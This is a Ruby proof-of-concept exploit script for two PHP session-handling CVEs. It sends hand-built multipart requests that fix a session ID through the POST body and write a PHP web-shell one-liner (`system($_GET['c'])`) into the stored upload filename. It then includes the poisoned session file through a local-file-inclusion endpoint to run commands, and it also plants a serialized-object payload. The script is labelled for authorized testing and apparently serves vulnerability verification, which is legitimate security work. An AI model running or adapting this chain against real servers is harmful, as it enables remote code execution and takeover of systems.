#!/usr/bin/env ruby
# frozen_string_literal: true
#
# CVE-2026-109618/109619 — Verify session file injection via upload_progress filename.
#
# Demonstrates:
#   1. Session fixation via POST body PHPSESSID (bypasses use_only_cookies=On)
#   2. Unvalidated filename stored raw in session file
#   3. LFI trigger to confirm RCE via the poisoned session file
#
# Usage:
#   ruby verify_session_injection.rb --target http://127.0.0.1:18080
#
# For authorized security testing only.

require 'socket'
require 'optparse'
require 'uri'

# Send a multipart upload request with separate cookie_sid and post_sid.
# cookie_sid = nil omits the Cookie header entirely, isolating the POST-body path.
def send_upload(host, port, path, cookie_sid, post_sid, filename)
  boundary = 'VERIFY'
  body = [
    "--#{boundary}\r\n",
    "Content-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n#{post_sid}\r\n",
    "--#{boundary}\r\n",
    "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nx\r\n",
    "--#{boundary}\r\n",
    "Content-Disposition: form-data; name=\"f\"; filename=\"#{filename}\"\r\n\r\nZ\r\n",
    "--#{boundary}--\r\n",
  ].join.b

  headers = [
    "POST #{path} HTTP/1.1",
    "Host: #{host}",
    "Content-Type: multipart/form-data; boundary=#{boundary}",
    "Content-Length: #{body.bytesize}",
  ]
  headers << "Cookie: PHPSESSID=#{cookie_sid}" if cookie_sid
  headers << "Connection: close"

  request = (headers.join("\r\n") + "\r\n\r\n").b + body

  TCPSocket.open(host, port) do |s|
    s.write(request)
    s.read
  end
rescue => e
  warn "  [!] send_upload failed: #{e}"
  ''
end

def trigger_lfi(host, port, lfi_path, include_path, cmd: 'id')
  request = [
    "GET #{lfi_path}?page=#{include_path}&c=#{cmd} HTTP/1.1",
    "Host: #{host}",
    "Connection: close",
    "\r\n",
  ].join("\r\n").b

  TCPSocket.open(host, port) do |s|
    s.write(request)
    s.read
  end
rescue => e
  warn "  [!] trigger_lfi failed: #{e}"
  ''
end

opts = {
  target:    'http://127.0.0.1:18080',
  path:      '/upload.php',
  lfi_path:  '/index.php',
  sid:       'verifysession00000000000000',
  save_path: '/tmp/sessions',
}

OptionParser.new do |o|
  o.banner = 'Usage: verify_session_injection.rb [options]'
  o.on('--target URL',      'Target base URL')       { |v| opts[:target]    = v }
  o.on('--path PATH',       'Upload endpoint')        { |v| opts[:path]      = v }
  o.on('--lfi-path PATH',   'LFI endpoint')           { |v| opts[:lfi_path]  = v }
  o.on('--sid SID',         'Base session ID prefix') { |v| opts[:sid]       = v }
  o.on('--save-path DIR',   'session.save_path')      { |v| opts[:save_path] = v }
end.parse!

u    = URI.parse(opts[:target])
host = u.host
port = u.port || 80

puts '[*] CVE-2026-109618/109619 — Session Injection Verification'
puts "[*] Target: #{opts[:target]}"
puts

# ── Test 1: Session fixation bypass ──────────────────────────────────────────
# CVE-2026-109618: rfc1867 MULTIPART_EVENT_FORMDATA accepts PHPSESSID from POST
# body regardless of session.use_only_cookies=On.
# We send a DIFFERENT SID in the Cookie header.  If PHP creates the POST-body
# session file (not the cookie one), the bypass is confirmed.
cookie_sid  = "#{opts[:sid]}_cookie"
post_sid_a  = "#{opts[:sid]}a"

puts '[1] Session fixation bypass (use_only_cookies=On circumvented)'
puts "    Cookie SID : #{cookie_sid}"
puts "    POST SID   : #{post_sid_a}"
send_upload(host, port, opts[:path], cookie_sid, post_sid_a, 'normal.txt')
puts "    → Check: sess_#{post_sid_a} created (NOT sess_#{cookie_sid}) = BYPASS CONFIRMED"

# ── Test 2: PHP code injection in filename ────────────────────────────────────
# add_assoc_string_ex stores the raw filename — no sanitization, no encoding.
# We inject a PHP one-liner that session_start() will execute when included.
post_sid_b   = "#{opts[:sid]}b"
php_payload  = "<?php system($_GET['c']);echo 'RCE_OK';?>"
escaped_b    = php_payload.gsub('"', '\\"')

puts "\n[2] PHP code injection in filename → session file poisoned"
puts "    Payload: #{php_payload}"
send_upload(host, port, opts[:path], nil, post_sid_b, escaped_b)
puts '    → Session file should contain raw PHP code in filename field'

# ── Test 3: LFI trigger — include the poisoned session file ──────────────────
puts "\n[3] LFI trigger — include sess_#{post_sid_b} via #{opts[:lfi_path]}"
sess_file = "#{opts[:save_path]}/sess_#{post_sid_b}"
resp = trigger_lfi(host, port, opts[:lfi_path], sess_file).force_encoding('binary')

status    = resp.split("\r\n", 2).first || 'NO RESPONSE'
body_text = resp.split("\r\n\r\n", 2)[1] || ''
puts "    HTTP: #{status}"

if body_text.include?('RCE_OK')
  puts '    [+] RCE CONFIRMED: injected PHP executed via LFI'
elsif body_text.match?(/uid=\d+/)
  puts '    [+] RCE CONFIRMED: command output found in response'
else
  puts '    [-] No RCE output — confirm vuln.php exists and session.save_path is correct'
end

# ── Test 4: Pipe + serialized object (Chain C precondition) ──────────────────
post_sid_c   = "#{opts[:sid]}c"
pipe_payload = 'x|O:4:"Evil":1:{s:3:"cmd";s:2:"id";}'
escaped_c    = pipe_payload.gsub('"', '\\"')

puts "\n[4] Pipe + serialized object in filename (Chain C precondition)"
send_upload(host, port, opts[:path], nil, post_sid_c, escaped_c)
puts '    → Session file should contain | in filename field'

puts
puts '[*] Session files to inspect on target:'
puts "    cat #{opts[:save_path]}/sess_#{post_sid_b}   # should contain PHP code"
puts "    cat #{opts[:save_path]}/sess_#{post_sid_c}   # should contain |O:4:\"Evil\""
puts
puts '[*] Session fixation proof:'
puts "    ls #{opts[:save_path]}/sess_#{post_sid_a}    # MUST exist"
puts "    ls #{opts[:save_path]}/sess_#{cookie_sid}    # must NOT exist"
